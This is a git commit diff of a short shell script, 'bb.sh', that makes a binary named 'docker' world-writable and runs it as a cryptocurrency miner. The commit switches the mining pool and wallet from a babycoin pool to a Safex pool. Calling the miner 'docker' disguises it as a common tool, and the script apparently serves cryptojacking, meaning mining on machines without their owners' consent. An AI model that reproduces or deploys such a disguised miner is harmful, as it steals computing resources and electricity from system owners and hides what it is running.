5b8d22e93e43488f4b1f1867d95cc4216273671e
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-03-11 20:59:02 +0700

    Update bb.sh

--- bb.sh
+++ bb.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 chmod 777 docker
-./docker -a rx/arq -o pool.babycoin.dev:4444 -u babyz9b4zdZfTNfUPtXEEd2aP2gyVNkVUN7znzfbzFMwMMCrJmZuT2mS4fu2aqqR8UeNpNBUBeVv67vS79s8DWigjbfo8jsEqEN -p $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1
+./docker -o sf.pool-pay.com:4025 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx
